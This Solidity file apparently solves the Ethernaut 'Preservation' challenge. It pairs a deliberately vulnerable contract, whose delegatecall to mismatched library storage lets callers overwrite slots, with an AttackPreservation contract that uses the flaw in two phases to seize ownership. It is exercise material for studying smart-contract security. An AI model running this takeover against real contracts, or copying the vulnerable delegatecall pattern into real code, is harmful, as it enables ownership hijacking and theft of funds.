// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}

contract AttackPreservation {

    address public unused1;
    address public unused2;
    address public owner;
    Preservation toAttack;

    constructor(address _levelInstance) public {
        toAttack = Preservation(_levelInstance);
    }

    //hit setFirstTime and pass in this contract's address as a uint,
    //there is a bug in LibraryContract and it will set this contract's address
    //in storage slot 0 of Preservation contract
    function attackPhase1() public {
        toAttack.setFirstTime(uint(address(this)));
        address timeZone1Library = toAttack.timeZone1Library();
        require(timeZone1Library == address(this));
    }

    //hit setFirstTime again but this time pass in msg.sender as a uint,
    //since this contract is now timeZone1Library it will call the function
    //below and set storage slot 3 equal to msg.sender
    function attackPhase2() public {
        toAttack.setFirstTime(uint(msg.sender));
        address preservationOwner = toAttack.owner();
        require(preservationOwner == tx.origin);
    }

    //set owner equal to the time casted as an address
    function setTime(uint _time) public {
        owner = address(_time);
    }

}